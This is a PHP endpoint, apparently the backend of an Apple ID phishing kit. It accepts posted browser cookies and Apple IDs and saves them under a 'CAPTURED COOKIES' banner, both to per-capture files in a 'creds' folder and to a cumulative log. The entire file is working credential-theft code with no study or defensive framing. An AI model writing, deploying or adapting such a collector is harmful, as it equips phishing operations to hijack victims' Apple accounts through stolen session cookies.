<?php
header('Content-Type: application/json');

$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data || empty($data['cookies'])) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'No cookies provided']);
    exit;
}

$cookies = $data['cookies'];
$appleid = $data['appleid'] ?? 'unknown';
$timestamp = date('Y-m-d_H-i-s');

$credsDir = dirname(__DIR__) . '/creds';
if (!file_exists($credsDir)) {
    mkdir($credsDir, 0755, true);
}

$filename = $credsDir . '/cookies_' . $timestamp . '.txt';

$sep = str_repeat('═', 55);
$logEntry = <<<LOG
{$sep}
CAPTURED COOKIES
{$sep}
Timestamp:    {$timestamp}
Apple ID:     {$appleid}
Cookies:
{$cookies}
{$sep}

LOG;

file_put_contents($filename, $logEntry);
file_put_contents($credsDir . '/all_cookies.log', $logEntry, FILE_APPEND);

error_log("ICFISH COOKIES | {$appleid}");

echo json_encode(['status' => 'success']);